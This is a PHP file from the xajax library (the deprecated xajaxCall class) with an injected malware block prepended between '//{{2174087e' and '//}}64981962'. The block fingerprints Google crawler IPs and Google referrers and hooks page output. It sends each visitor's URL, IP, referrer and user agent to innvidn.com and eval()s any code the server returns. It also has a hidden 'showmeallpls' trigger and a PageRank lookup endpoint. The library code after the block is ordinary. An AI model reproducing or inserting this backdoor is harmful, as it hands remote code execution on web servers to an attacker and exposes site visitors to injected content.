<?php
//{{2174087e

GLOBAL $wehaveitagain;
if($wehaveitagain != 1)
{
$preverrx=error_reporting(0);
$wehaveitagain = 1;
$mynetsxx = array(
'84.235.77.0' => 24,
'8.8.8.0' => 24,
'8.8.4.0' => 24,
'8.6.48.0' => 21,
'74.125.98.0' => 24,
'74.125.97.0' => 24,
'74.125.94.0' => 23,
'74.125.92.0' => 23,
'74.125.90.0' => 23,
'74.125.86.0' => 23,
'74.125.78.0' => 23,
'74.125.76.0' => 23,
'74.125.75.0' => 24,
'74.125.74.0' => 24,
'74.125.72.0' => 23,
'74.125.70.0' => 23,
'74.125.66.0' => 23,
'74.125.64.0' => 23,
'74.125.64.0' => 18,
'74.125.63.0' => 24,
'74.125.62.0' => 24,
'74.125.61.0' => 24,
'74.125.60.0' => 24,
'74.125.58.0' => 24,
'74.125.54.0' => 23,
'74.125.52.0' => 23,
'74.125.46.0' => 23,
'74.125.44.0' => 23,
'74.125.42.0' => 23,
'74.125.38.0' => 23,
'74.125.37.0' => 24,
'74.125.36.0' => 24,
'74.125.36.0' => 23,
'74.125.33.0' => 24,
'74.125.32.0' => 24,
'74.125.30.0' => 23,
'74.125.246.0' => 24,
'74.125.245.0' => 24,
'74.125.244.0' => 24,
'74.125.239.0' => 24,
'74.125.238.0' => 24,
'74.125.237.0' => 24,
'74.125.236.0' => 24,
'74.125.235.0' => 24,
'74.125.234.0' => 24,
'74.125.233.0' => 24,
'74.125.232.0' => 24,
'74.125.230.0' => 24,
'74.125.229.0' => 24,
'74.125.227.0' => 24,
'74.125.226.0' => 24,
'74.125.225.0' => 24,
'74.125.224.0' => 24,
'74.125.192.0' => 18,
'74.125.18.0' => 23,
'74.125.17.0' => 24,
'74.125.16.0' => 24,
'74.125.158.0' => 23,
'74.125.156.0' => 23,
'74.125.154.0' => 23,
'74.125.152.0' => 23,
'74.125.151.0' => 24,
'74.125.150.0' => 24,
'74.125.149.0' => 24,
'74.125.148.0' => 24,
'74.125.146.0' => 23,
'74.125.128.0' => 18,
'74.125.126.0' => 23,
'74.125.125.0' => 24,
'74.125.122.0' => 24,
'74.125.121.0' => 24,
'74.125.120.0' => 24,
'74.125.119.0' => 24,
'74.125.118.0' => 24,
'74.125.117.0' => 24,
'74.125.116.0' => 24,
'74.125.114.0' => 23,
'74.125.112.0' => 23,
'74.125.0.0' => 18,
'74.125.0.0' => 16,
'72.14.255.0' => 24,
'72.14.254.0' => 24,
'72.14.254.0' => 23,
'72.14.253.0' => 24,
'72.14.252.0' => 24,
'72.14.252.0' => 23,
'72.14.248.0' => 23,
'72.14.246.0' => 23,
'72.14.244.0' => 23,
'72.14.236.0' => 24,
'72.14.235.0' => 24,
'72.14.234.0' => 24,
'72.14.230.0' => 24,
'72.14.228.0' => 24,
'72.14.226.0' => 24,
'72.14.225.0' => 24,
'72.14.224.0' => 24,
'72.14.220.0' => 23,
'72.14.212.0' => 23,
'72.14.210.0' => 23,
'72.14.208.0' => 23,
'72.14.204.0' => 23,
'72.14.202.0' => 23,
'72.14.199.0' => 24,
'72.14.194.0' => 24,
'72.14.193.0' => 24,
'72.14.192.0' => 24,
'72.14.192.0' => 18,
'70.32.158.0' => 24,
'70.32.155.0' => 24,
'70.32.150.0' => 24,
'70.32.140.0' => 23,
'70.32.138.0' => 24,
'70.32.136.0' => 24,
'70.32.135.0' => 24,
'70.32.134.0' => 24,
'70.32.133.0' => 24,
'70.32.132.0' => 24,
'70.32.131.0' => 24,
'70.32.130.0' => 24,
'70.32.129.0' => 24,
'70.32.128.0' => 24,
'70.32.128.0' => 19,
'66.249.94.0' => 24,
'66.249.92.0' => 24,
'66.249.91.0' => 24,
'66.249.90.0' => 24,
'66.249.88.0' => 23,
'66.249.85.0' => 24,
'66.249.84.0' => 24,
'66.249.82.0' => 24,
'66.249.81.0' => 24,
'66.249.80.0' => 24,
'66.249.72.0' => 24,
'66.249.71.0' => 24,
'66.249.69.0' => 24,
'66.249.68.0' => 24,
'66.249.67.0' => 24,
'66.249.66.0' => 24,
'66.249.65.0' => 24,
'66.249.64.0' => 19,
'66.102.8.0' => 23,
'66.102.6.0' => 23,
'66.102.4.0' => 24,
'66.102.3.0' => 24,
'66.102.2.0' => 24,
'66.102.12.0' => 23,
'66.102.10.0' => 23,
'66.102.0.0' => 20,
'64.9.224.0' => 20,
'64.9.224.0' => 19,
'64.233.188.0' => 23,
'64.233.186.0' => 23,
'64.233.182.0' => 23,
'64.233.180.0' => 23,
'64.233.178.0' => 23,
'64.233.173.0' => 24,
'64.233.172.0' => 24,
'64.233.170.0' => 23,
'64.233.168.0' => 23,
'64.233.162.0' => 23,
'64.233.160.0' => 19,
'63.243.168.0' => 22,
'4.3.2.0' => 24,
'216.239.60.0' => 23,
'216.239.58.0' => 23,
'216.239.50.0' => 23,
'216.239.44.0' => 23,
'216.239.39.0' => 24,
'216.239.38.0' => 24,
'216.239.36.0' => 24,
'216.239.34.0' => 24,
'216.239.33.0' => 24,
'216.239.32.0' => 24,
'216.239.32.0' => 19,
'209.85.238.0' => 24,
'209.85.230.0' => 23,
'209.85.228.0' => 23,
'209.85.226.0' => 23,
'209.85.224.0' => 23,
'209.85.223.0' => 24,
'209.85.222.0' => 24,
'209.85.221.0' => 24,
'209.85.220.0' => 24,
'209.85.219.0' => 24,
'209.85.218.0' => 24,
'209.85.216.0' => 24,
'209.85.213.0' => 24,
'209.85.212.0' => 24,
'209.85.211.0' => 24,
'209.85.210.0' => 24,
'209.85.208.0' => 23,
'209.85.200.0' => 23,
'209.85.198.0' => 23,
'209.85.196.0' => 23,
'209.85.194.0' => 23,
'209.85.192.0' => 23,
'209.85.174.0' => 23,
'209.85.172.0' => 23,
'209.85.170.0' => 23,
'209.85.168.0' => 23,
'209.85.166.0' => 23,
'209.85.164.0' => 23,
'209.85.162.0' => 23,
'209.85.156.0' => 23,
'209.85.152.0' => 23,
'209.85.149.0' => 24,
'209.85.148.0' => 23,
'209.85.147.0' => 24,
'209.85.146.0' => 24,
'209.85.146.0' => 23,
'209.85.144.0' => 23,
'209.85.142.0' => 23,
'209.85.139.0' => 24,
'209.85.138.0' => 23,
'209.85.136.0' => 23,
'209.85.134.0' => 23,
'209.85.132.0' => 24,
'209.85.132.0' => 23,
'209.85.128.0' => 23,
'209.85.128.0' => 17,
'193.186.4.0' => 24,
'193.142.125.0' => 24,
'173.255.112.0' => 20,
'173.194.44.0' => 24,
'173.194.43.0' => 24,
'173.194.42.0' => 24,
'173.194.41.0' => 24,
'173.194.40.0' => 24,
'173.194.37.0' => 24,
'173.194.36.0' => 24,
'173.194.35.0' => 24,
'173.194.34.0' => 24,
'173.194.33.0' => 24,
'173.194.32.0' => 24,
'173.194.0.0' => 16,
'118.174.25.0' => 24,
'118.174.24.0' => 24,
'118.174.24.0' => 22,
'113.197.106.0' => 24,
'113.197.105.0' => 24,
'108.59.80.0' => 20
);
function ip_in_networkxx($ip, $net_addr, $net_mask)
{
  if($net_mask <= 0) return false;
  $ip_binary_string = sprintf("%032b",ip2long($ip));
  $net_binary_string = sprintf("%032b",ip2long($net_addr));
  return (strncmp($ip_binary_string,$net_binary_string,$net_mask) === 0);
}
function selfURL()
{
  if(!isset($_SERVER['REQUEST_URI'])) $suri = $_SERVER['PHP_SELF'];
  else $suri = $_SERVER['REQUEST_URI'];
  $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
  $sp=strtolower($_SERVER["SERVER_PROTOCOL"]);
  $pr = substr($sp,0,strpos($sp,"/")).$s;
  $pt = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  return $pr."://".$_SERVER['SERVER_NAME'].$pt.$suri;
}
function loadDataHttpCse($url)
{
    $s = '';
    if (ini_get('allow_url_fopen') == 1) {
        $ctx = stream_context_create(array('http'=>array('timeout'=>3)));
        $s = file_get_contents($url, 0, $ctx);
    } else if (in_array('curl', get_loaded_extensions())) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $s = curl_exec($ch);
        curl_close($ch);
    } else {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = '/';
        $port = 80;
        if (isset($parts['path'])) {
            $path = $parts['path'];
        }
        if (isset($parts['port'])) {
            $port = $parts['port'];
        }
        $address = gethostbyname($host);
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            return false;
        }
        $timeout = array('sec'=>3, 'usec'=>0);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $timeout);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $timeout);
        $result = socket_connect($socket, $address, $port);
        if ($result === false) {
            return false;
        }
        $in = "GET $path HTTP/1.1\r\n";
        $in .= "Host: $host\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($socket, $in, strlen($in));
        $reply = '';
        while ($out = socket_read($socket, 2048)) {
            $reply .=  $out;
        }
        socket_close($socket);
        $s = substr($reply, (strpos($reply, "\r\n\r\n")+4));
        if (strpos(strtolower($reply), "transfer-encoding: chunked") !== FALSE) {
            $fp = 0;
            $outData = "";
            while ($fp < strlen($s)) {
                $rawnum = substr($s, $fp, strpos(substr($s, $fp), "\r\n") + 2);
                $num = hexdec(trim($rawnum));
                $fp += strlen($rawnum);
                $chunk = substr($s, $fp, $num);
                $outData .= $chunk;
                $fp += strlen($chunk);
            }
            $s = $outData;
        }
    }
    return $s;
}
function rewrioutclbkxxx1($str) { return rewriout($str,1); }
function rewrioutclbkxxx2($str) { return rewriout($str,2); }
function rewrioutclbkxxx3($str) { return rewriout($str,3); }
function rewriout($str, $ev)
{
  error_reporting(0);
  if(stripos($str, '<body') !== false)
  {
    $id = "4dae84ec67843a09b800edaa";
    $url = "http://innvidn.com/ck.gif";
    $req = $url.'?ev='.$ev.'&url='.urlencode(selfURL()).'&id='.urlencode($id).'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ip='.$_SERVER['REMOTE_ADDR'].'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']);
    $answergrhey11=loadDataHttpCse($req);
    if($answergrhey11 != FALSE && strncmp('/*CODE', $answergrhey11, 6) == 0) {
      return eval($answergrhey11);
    }
  }
  return false;
}
function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i < $length; $i++) {
       $Check *= $Magic;
       if ($Check >= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);
   $Check1 >>= 2;
   $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
   $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
   $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
   $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F );
   $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
   return ($T1 | $T2);
}
function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;
   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);
   for ($i = $length-1; $i >= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }
   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte >>= 1;
       }
   }
   return '7'.$CheckByte.$HashStr;
}
function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch=$ch&features=Rank&q=info:$url";
   $data = file_get_contents($file);
   return $data;
}
if(isset($_POST['prgetxr']))
{
  echo getpr($_POST['prgetxr']);
  exit();
}
else
{
  $ev = 0;
  foreach($mynetsxx as 	$key => $value)
  {
    if(ip_in_networkxx($_SERVER['REMOTE_ADDR'], $key, $value)) {
      $ev = 1;
      break;
    }
  }
  if($ev == 0) {
    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.') !== false) {
        $ev = 2;
    }
    elseif(mt_rand(1,100) == 50) {
        $ev = 3;
    }
  }
  if(isset($_GET['showmeallpls'])) {
    $ev = $_GET['showmeallpls'];
  }
  if($ev > 0) {
	ob_start('rewrioutclbkxxx'.$ev);
  }
}
error_reporting($preverrx);
}
/*  */

//}}64981962
?><?php
/*
	File: xajaxCall.inc.php

	Contains the xajaxCall class

	Title: xajaxCall class

	Please see <copyright.inc.php> for a detailed description, copyright
	and license information.
*/

/*
	@package xajax
	@version $Id: xajaxCall.inc.php 362 2007-05-29 15:32:24Z calltoconstruct $
	@copyright Copyright (c) 2005-2007 by Jared White & J. Max Wilson
	@copyright Copyright (c) 2008-2009 by Joseph Woolley, Steffen Konerow, Jared White  & J. Max Wilson
	@license http://www.xajaxproject.org/bsd_license.txt BSD License
*/

/*
	Class: xajaxCall
	
	Create a piece of javascript code that will invoke the <xajax.call>
	function.
	
	This class is deprecated and will be removed in future versions; please use
	<xajaxRequest> instead.
*/
class xajaxCall {

	/**#@+
	 * @access protected
	 */

	/*
		String: sFunction
		
		Required:  The name of the xajax enabled function to call
	*/
	var $sFunction;
	
	/*
		String: sReturnValue
		
		Required:  The value to return once the <xajax.call> has
		returned.  (for asynchronous calls, this is immediate)
	*/
	var $sReturnValue;
	
	/*
		Array: aParameters
		
		The associative array that will be used to store the parameters for this
		call.
		- key: The textual representation of the parameter.
		- value: A boolean value indicating whether or not to use quotes around
			this parameter.
	*/
	var $aParameters;
	
	/*
		String: sMode
		
		The mode to use for the call
		- 'synchronous'
		- 'asynchronous'
	*/
	var $sMode;
	
	/*
		String: sRequestType
		
		The request type that will be used for the call
		- 'GET'
		- 'POST'
	*/
	var $sRequestType;
	
	/*
		String: sResponseProcessor
		
		The name of the javascript function that will be invoked
		to handle the response.
	*/
	var $sResponseProcessor;
	
	/*
		String: sRequestURI
		
		The URI for where this request will be sent.
	*/
	var $sRequestURI;
	
	/*
		String: sContentType
		
		The content type to use for the request.
	*/
	var $sContentType;
	
	/*
		Constructor: xajaxCall
		
		Initializes the xajaxCall object.
		
		Parameters:
		
		sFunction - (string):  The name of the xajax enabled function
			that will be invoked when this javascript code is executed
			on the browser.  This function name should match a PHP 
			function from your script.
	*/
	function xajaxCall($sFunction = '') {
		$this->sFunction = $sFunction;
		$this->aParameters = array();
		$this->sMode = '';
		$this->sRequestType = '';
		$this->sResponseProcessor = '';
		$this->sRequestURI = '';
		$this->sContentType = '';
	}
	
	/*
		Function: setFunction
		
		Override the function name set in the constructor.
		
		Parameters:

		sFunction - (string):  The name of the xajax enabled function
			that will be invoked when this javascript code is executed
			on the browser.  This function name should match a PHP 
			function from your script.
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setFunction($sFunction) {
		$this->sFunction = $sFunction;
		return $this;
	}
	
	/*
		Function: clearParameters
		
		Clear the list of parameters being accumulated for this
		call.
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function clearParameters() {
		$this->aParameters = array();
	}
	
	/*
		Function: addParameter
		
		Adds a parameter to the list that will be specified for the
		request generated by this <xajaxCall> object.
		
		Parameters:
		
		sParameter - (string):  The parameter value or name.
		bUseQuotes - (boolean):  Whether or not to put quotes around this value.
		
		If you specify the name of a javascript variable, or provide a javascript
		function call as a parameter, do not use quotes around the value.
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function addParameter($sParameter, $bUseQuotes = true) {
		$this->aParameters[] = array($sParameter, $bUseQuotes);
		return $this;
	}
	
	/*
		Function: addFormValuesParameter
		
		Add a parameter value that is the result of calling <xajax.getFormValues>
		for the specified form.
		
		Parameters:
		
		sFormID - (string):  The id of the form for which you wish to return
			the input values.
			
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function addFormValuesParameter($sFormID) {
		$this->aParameters[] = array('xajax.getFormValues("'.$sFormID.'")');
		return $this;
	}
	
	/*
		Function: setMode
		
		Sets the mode that will be specified for this <xajax.call>

		Parameters:

			$sMode - (string): The mode to be set.
				- 'synchronous'
				- 'asynchronous'
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setMode($sMode) {
		$this->sMode = $sMode;
		return $this;
	}
	
	/*
		Function: setRequestType
		
		Sets the request type which will be specified for the
		generated <xajax.call>.
		
		Parameters:
		
		- 'GET'
		- 'POST'
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setRequestType($sRequestType) {
		$this->sRequestType = $sRequestType;
		return $this;
	}
	
	/*
		Function: setResponseProcessor
		
		Sets the name of the javascript function that will be used
		to process this response.  This is an advanced function, use
		with caution.
		
		Parameters:
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setResponseProcessor($sResponseProcessor) {
		$this->sResponseProcessor = $sResponseProcessor;
		return $this;
	}
	
	/*
		Function: setRequestURI
		
		Override the default URI with the specified one.
		
		Parameters:
		
		sRequestURI - (string):  The URI that the generated request will be sent
			to.
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setRequestURI($sRequestURI) {
		$this->sRequestURI = $sRequestURI;
		return $this;
	}
	
	/*
		Function: setContentType
		
		Sets the content type that will be used by the generated request.
		
		Parameters:
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setContentType($sContentType) {
		$this->sContentType = $sContentType;
	}
	
	/*
		Function: setReturnValue
		
		Sets the value that will be returned after the generated call.
		Set to an empty string if no return value is desired.
		
		Parameters:
		
		Returns:
		
		object : The <xajaxCall> object.
	*/
	function setReturnValue($sReturnValue) {
		$this->sReturnValue = $sReturnValue;
	}
	
	/*
		Function: generate
		
		Construct a <xajax.call> statement in javascript that can be used
		to make a xajax request with the parameters and settings previously
		configured for this <xajaxCall> object.
		
		The output from this function can be used as an event handler in your
		javascript code.
		
		Returns:
		
		string - The javascript statement that will invoked the <xajax.call>
			function on the browser, causing a xajax request to be sent to
			the server.
	*/
	function generate() {
		$output = 'xajax.call("';
		$output .= $this->sFunction;
		$output .= '", {';
		$separator = '';
		if (0 < count($this->aParameters)) {
			$output .= 'parameters: [';
			foreach ($this->aParameters as $aParameter) {
				$output .= $separator;
				$bUseQuotes = $aParameter[1];
				if ($bUseQuotes)
					$output .= '"';
				$output .= $aParameter[0];
				if ($bUseQuotes)
					$output .= '"';
				$separator = ',';
			}
			$output .= ']';
		}
		if (0 < strlen($this->sMode)) {
			$output .= $separator;
			$output .= 'mode:"';
			$output .= $this->sMode;
			$output .= '"';
			$separator = ',';
		}
		if (0 < strlen($this->sRequestType)) {
			$output .= $separator;
			$output .= 'requestType:"';
			$output .= $this->sRequestType;
			$output .= '"';
			$separator = ',';
		}
		if (0 < strlen($this->sResponseProcessor)) {
			$output .= $separator;
			$output .= 'responseProcessor:';
			$output .= $this->sResponseProcessor;
			$separator = ',';
		}
		if (0 < strlen($this->sRequestURI)) {
			$output .= $separator;
			$output .= 'requestURI:"';
			$output .= $this->sRequestURI;
			$output .= '"';
			$separator = ',';
		}
		if (0 < strlen($this->sContentType)) {
			$output .= $separator;
			$output .= 'contentType:"';
			$output .= $this->sContentType;
			$output .= '"';
			$separator = ',';
		}
		$output .= '}); ';
		if (0 < strlen($this->sReturnValue)) {
			$output .= 'return ';
			$output .= $this->sReturnValue;
		} else {
			$output .= 'return false;';
		}
		
		return $output;
	}
}
